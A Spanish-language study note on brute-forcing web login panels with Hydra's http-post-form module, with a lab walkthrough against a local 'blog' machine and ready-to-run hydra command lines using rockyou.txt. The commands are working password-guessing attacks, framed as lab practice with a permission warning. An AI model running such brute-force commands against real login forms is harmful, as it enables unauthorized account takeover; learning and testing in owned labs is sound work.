# Hydra - Ataques a Paneles Web

> [!info] Idea principal
> Hydra tambien puede atacar formularios de login web con el modulo `http-post-form`. La clave es interceptar la peticion con Burp Suite para saber **que parametros envia el formulario** y **que mensaje de error** devuelve cuando las credenciales son incorrectas.

## Por que es Distinto a SSH o FTP

Con `ssh` o `ftp` ([[4. Hydra - Ataque a Contraseñas]]) basta indicar el servicio y la IP, porque el propio protocolo dice si el login ha fallado. En una web no existe ese aviso: el servidor responde siempre con un `200 OK`, tanto si acierto como si falla.

Por eso en un formulario web tengo que darle a Hydra tres cosas a mano:

- La **ruta** del formulario (por ejemplo `/my_weblog/admin.php`).
- Los **parametros** del POST (por ejemplo `username=...&password=...`).
- El **mensaje de error** que aparece cuando las credenciales son incorrectas.

> [!tip] Como consigo esos datos
> Interceptando el envio del formulario con **Burp Suite**: ahi veo la ruta, el metodo y los nombres exactos de los campos. El mensaje de error lo saco probando un login falso en el navegador.

## Sintaxis Basica

```bash
hydra -l usuario -P diccionario IP http-post-form "/ruta:parametros:mensaje_de_error"
```

### Las Tres Partes Separadas por `:`

- `/ruta`: la ruta del formulario dentro del servidor (sin la IP).
- `parametros`: el cuerpo del POST, usando `^USER^` y `^PASS^` donde Hydra debe inyectar cada valor.
- `mensaje_de_error`: texto que aparece en la respuesta cuando el login falla.

> [!note] Como recordarlo
> `^USER^` y `^PASS^` son los huecos que Hydra rellena. Si un campo lo conozco fijo (por ejemplo `username=admin`), lo dejo escrito tal cual y solo pongo `^PASS^` en el otro.

### Parametros Usados en el Laboratorio

- `-t 64`: 64 tareas en paralelo. En web se puede subir porque HTTP no limita como SSH.
- `-l admin`: usuario conocido.
- `-P /usr/share/wordlists/rockyou.txt`: diccionario de contraseñas.
- `http-post-form`: modulo para formularios enviados por POST.

> [!warning] Importante
> Solo en maquinas propias, laboratorios o entornos con permiso. Un ataque de este tipo genera muchisimas peticiones y queda registrado en los logs del servidor web.

## Caso Practico

Arranco la maquina **blog** y, tras un escaneo ARP para localizarla en la red, entro al panel de administracion en `http://192.168.0.208/my_weblog/admin.php`.

### Paso 1: Localizar la Maquina

```bash
arp-scan -I eth0 --localnet
```

### Paso 2: Interceptar el Login con Burp Suite

Configuro el proxy del navegador, escribo credenciales cualquiera (`admin` / `admin`) y envio el formulario para capturar la peticion.

```text

```

> [!info] Datos que saco de aqui
> - Metodo: `POST` → modulo `http-post-form`.
> - Ruta: `/my_weblog/admin.php`.
> - Parametros: `username` y `password` (esos nombres exactos son los que necesita Hydra).

Ademas, al fallar el login la web muestra el mensaje `Incorrect username or password.`, que sera la cadena de fallo.

### Paso 3: Fuerza Bruta al Panel Web

Ya tengo las tres piezas, asi que lanzo Hydra. Como asumo que el usuario es `admin`, dejo `username=admin` fijo y solo hago fuerza bruta a la contraseña.

```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.208 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```

## Comandos Utiles

### Fuerza bruta a contraseña (usuario conocido)

```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.208 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```

### Fuerza bruta a usuario y contraseña a la vez

```bash
hydra -t 64 -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.208 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."
```

### Saltar la espera del restorefile

```bash
hydra -I -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.208 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```

### Parar en cuanto encuentre una credencial valida

```bash
hydra -f -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.208 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```

## Flujo Resumido

> [!example] Pasos tipicos
> 1. Localizar la maquina con `arp-scan` y encontrar el panel de login.
> 2. Interceptar el envio del formulario con Burp Suite.
> 3. Anotar la ruta y los nombres de los parametros (`username`, `password`...).
> 4. Provocar un login fallido y copiar el mensaje de error.
> 5. Montar la cadena `"/ruta:parametros:mensaje_de_error"` con `^USER^` / `^PASS^`.
> 6. Lanzar Hydra con `http-post-form`.
> 7. Probar la credencial encontrada en el panel web.

## Checklist Rapido

- [ ] Confirmar que tengo permiso para atacar la maquina.
- [ ] Identificar el formulario de login y su ruta.
- [ ] Interceptar la peticion con Burp para ver los parametros reales.
- [ ] Comprobar si es `POST` (`http-post-form`) o `GET` (`http-get-form`).
- [ ] Copiar literalmente el mensaje de error del login fallido.
- [ ] Sustituir los valores por `^USER^` y `^PASS^`.
- [ ] Elegir diccionario (`rockyou.txt`) y subir `-t` porque es HTTP.
- [ ] Lanzar Hydra y validar la credencial en el navegador.

## Errores Comunes

> [!bug] Si Hydra da todo por valido o nada por valido
> - **Todo valido**: el mensaje de error no coincide con el de la web. Debe ser exacto (mayusculas, punto final incluido).
> - **Nada valido**: nombres de parametros mal copiados, ruta incorrecta, o el formulario es `GET` en vez de `POST`.
> - Si la cadena lleva `:` o `&` como parte del valor, hay que escaparlos con `\`.
